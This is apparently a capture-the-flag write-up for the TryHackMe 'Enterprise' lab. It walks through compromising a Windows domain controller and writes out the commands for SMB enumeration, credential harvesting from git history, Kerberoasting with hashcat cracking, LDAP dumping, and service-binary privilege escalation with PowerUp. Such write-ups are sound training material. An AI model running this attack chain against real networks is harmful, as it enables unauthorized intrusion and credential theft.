---
description: https://tryhackme.com/room/enterprise
---

# Enterprise

## Nmap

```
nmap 10.10.116.56 -p- -sS -sV 

PORT      STATE    SERVICE       VERSION
53/tcp    filtered domain
80/tcp    open     http          Microsoft IIS httpd 10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-12 18:42:06Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7990/tcp  open     http          Microsoft IIS httpd 10.0
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49672/tcp open     msrpc         Microsoft Windows RPC
49678/tcp open     msrpc         Microsoft Windows RPC
49702/tcp open     msrpc         Microsoft Windows RPC
49706/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Note:** Add the following to /etc/hosts.

```
<IP>     lab.enterprise.thm lab-dc.enterprise.thm enterprise.thm 
```

Starting out we check SMB and find that anonymous login is allowed.

```bash
crackmapexec smb <IP> -u 'a' -p '' 
```

![](<../../../.gitbook/assets/image (891).png>)

Running `crackmapexec` with various parameters we are able to identify users using a RID brute force.

```bash
crackmapexec smb <IP> -u 'a' -p '' --loggedon-users --sessions --users  --rid-brute 10000 | grep '(SidTypeUser)' 
```

![](<../../../.gitbook/assets/image (117) (2).png>)

However, we are unable to proceed with any of this information so far. Brute forcing the user accounts proved to be unsuccessful.

Checking the web server running on port 7790 reveals the following below; where we see that Enterprise-THM is moving to Github.

![](<../../../.gitbook/assets/image (439).png>)

Searching for Enterprise-THM on Google shows the following Github page.

**Github:** [https://github.com/Enterprise-THM](https://github.com/Enterprise-THM)

On the right we see a profile for "nik".

![](<../../../.gitbook/assets/image (254).png>)

We can see under the profile a mgmtScript.ps1 file. Nothing of interest here so far...

![](<../../../.gitbook/assets/image (384).png>)

However, looking back at the file commit history we see the original file upload which had user credentials stored within the script.

![](<../../../.gitbook/assets/image (202).png>)

We can take these user credentials and list the SMB shares on the target Domain Controller.

![](<../../../.gitbook/assets/image (186).png>)

Finding some sensitive documents. I tried to crack these after converting them to a hash format with `office2john.py`. I was unable to successfully crack the hashes after some time.

![](<../../../.gitbook/assets/image (2069).png>)

Looking inside the path shown below we find `Consolehost_hisory.txt`.

![](<../../../.gitbook/assets/image (44) (2).png>)

Reading the contents of `Consolehost_hisory.txt` we see some credential information.

![](<../../../.gitbook/assets/image (449).png>)

I was unable to find anywhere where the credentials are usable. As such, I went back to further enumerating with Nik's credentials.

```bash
GetUserSPNs.py lab.enterprise.thm/nik:<Password> -request -dc-ip <IP>
```

![](<../../../.gitbook/assets/image (1765).png>)

We recevie a TGT hash for the account _bitbucket_. Using Hashcat we are able to crack this quite quickly aganst the `rockyou.txt` wordlist.

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```

![](<../../../.gitbook/assets/image (62).png>)

With the new set of credentials we are then able to run `ldapdomaindump` to dump `LDAP` information into HTLM format.

```
ldapdomaindump -u lab.enterprise.thm\\bitbucket -p <Password> ldap://<IP>
```

![](<../../../.gitbook/assets/image (484).png>)

Viewing the Domain Users group we notice in the description field, a password is left in the clear for the user `contractor-temp`. Again, we are unable to process in the envionment with these credentials.

Looking furhter into the LDAP information we see the user bitbucket is a member of "Remote Desktop Users".

![](<../../../.gitbook/assets/image (315).png>)

```bash
/xfreerdp /v:<IP> /u:'bitbucket' /p:<Password> +clipboard /dynamic-resolution
```

We can then login over `RDP` and grab the `user.txt` flag.

![](<../../../.gitbook/assets/image (521).png>)

After grabbing the flag `PowerUp.ps1` is uploaded to the Domain Controller and run with the "Invoke-AllChecks" command.

![](<../../../.gitbook/assets/image (1578).png>)

We see that the service "zerotieroneservice" runs as SYSTEM, and we have the ability to change the service binary as well as manipulate the running state of the service.

The command below is used to abuse this as well as add our current user bitbucket to the Administrators group.

```powershell
Install-ServiceBinary -Name "zerotieroneservice" -Command "net localgroup Administrators lab.enterprise.thm\bitbucket /add"
```

![](<../../../.gitbook/assets/image (921).png>)

After performing the service abuse we then stop and start the zerotieroneservice.

```
sc.exe stop zerotieroneservice
sc.exe start zerotieroneservice
```

Checking bitbucket's group memberships we see we are now a member of the Administrators group.

![](<../../../.gitbook/assets/image (173).png>)

Firstly, we need to logoff from command prompt and sign in again over RDP to referesh our privileges to reflect that of an Administrator.

![](<../../../.gitbook/assets/image (1737).png>)

We are then able to read the `root.txt` flag on the Administrators desktop.

![](<../../../.gitbook/assets/image (207).png>)
